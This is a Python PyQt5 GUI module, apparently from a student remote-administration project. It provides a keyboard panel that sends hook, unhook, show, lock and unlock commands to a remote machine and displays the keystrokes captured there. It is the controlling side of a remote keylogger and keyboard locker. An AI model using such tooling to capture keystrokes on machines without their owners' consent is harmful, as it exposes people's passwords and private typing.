# -*- coding: utf-8 -*-
"""
Created on Thu Oct 21 10:56:15 2021
@author: DELL
"""

from gui.client.Keyboard.client_keyboard_ui import Ui_Keyboard

from PyQt5.QtWidgets import QWidget
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QApplication
from PyQt5.QtWidgets import QMainWindow
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QVBoxLayout

import json
import sys
import keyboard

from gui.popup import PopUp

class Subclass_Keyboard(QWidget):
      
    #TAO GUI
    def __init__(self, parent = None):
        super(Subclass_Keyboard, self).__init__()
        self.ui = Ui_Keyboard()
        self.ui.setupUi(self)
        self.hookList=[]
        self.hooked=False
        
        self.parent = parent
        self.ui.hook_button.clicked.connect(self.hook)
        self.ui.unhook_button.clicked.connect(self.unhook)
        self.ui.show_button.clicked.connect(self.showButtonPress)
        self.ui.lock_button.clicked.connect(self.lock)
        self.ui.unlock_button.clicked.connect(self.unlock)

        
        self.textKeyboard=self.ui.textBrowser
        
        
    def show(self):
        super().show()
        
    def hook(self):
        try:
            self.hookList.clear()
            self.hooked= True
            self.parent.Command( { "state" : "Hook"})
            check=self.parent.Recv()
            check=json.loads(check.decode('utf-8'))
            if(check==True):
                self.textShow("Bat dau hook")
            else:
                self.textShow("That bai")
        except Exception as e:
            msg = "Cannot hook.\n" + str(e)
            PopUp.show_popup(self, "Error", msg)
    def unhook(self):
        try:
            if(self.hooked==True):
                self.hooked= False
                self.parent.Command( { "state" : "Unhook"})
                data=self.parent.Recv()
                check=json.loads(data.decode('utf-8'))
                if(check==True):
                    self.textShow("Da unhook")
                else:
                    self.textShow("That bai")
            else:
                self.textShow("Chua hook")
        except Exception as e:
            msg = "Cannot unhook.\n" + str(e)
            PopUp.show_popup(self, "Error", msg)
    
    def lock(self):
        try:
            self.parent.Command( { "state" : "Lock"})
            check=self.parent.Recv()
            check=json.loads(check.decode('utf-8'))
            if(check==True):
                self.textShow("Da lock")
            else:
                self.textShow("That bai")
        except Exception as e:
            msg = "Cannot lock.\n" + str(e)
            PopUp.show_popup(self, "Error", msg)
            
    def unlock(self):
        try:
            self.parent.Command( { "state" : "Unlock"})
            check=self.parent.Recv()
            check=json.loads(check.decode('utf-8'))
            if(check==True):
                self.textShow("Da unlock")
            else:
                self.textShow("That bai")
        except Exception as e:
            msg = "Cannot unlock.\n" + str(e)
            PopUp.show_popup(self, "Error", msg)
    
    def specialKey(self, key):
        if(keyboard.is_modifier(key) or key=='space'or key=='enter' or key=='backspace'):
            newkey='['+key.upper()+']'
        else:
            newkey=key
        return newkey
            
        
    def showButtonPress(self):
        try:
            if(self.hooked==True):
                self.parent.Command( { "state" : "Show"})
                data=self.parent.Recv()          
                self.hookList.extend(json.loads(data.decode('utf-8')))
                for i in range(len(self.hookList)):
                    self.hookList[i]=self.specialKey(self.hookList[i])
                for i in range(len(self.hookList)):
                    text=''.join(self.hookList)
                self.textShow(text)
            else:
                self.textShow("Chua hook")
        except Exception as e:
            msg = "Cannot show.\n" + str(e)
            PopUp.show_popup(self, "Error", msg)
        
        
            
    def textShow(self, text):
        self.textKeyboard.clear()
        self.textKeyboard.setText(text)
        
        
#Kich hoat
if __name__ == "__main__":
    app = QApplication(sys.argv)
    main_win = Subclass_Keyboard()
    main_win.show()
    sys.exit(app.exec_())
        
        
        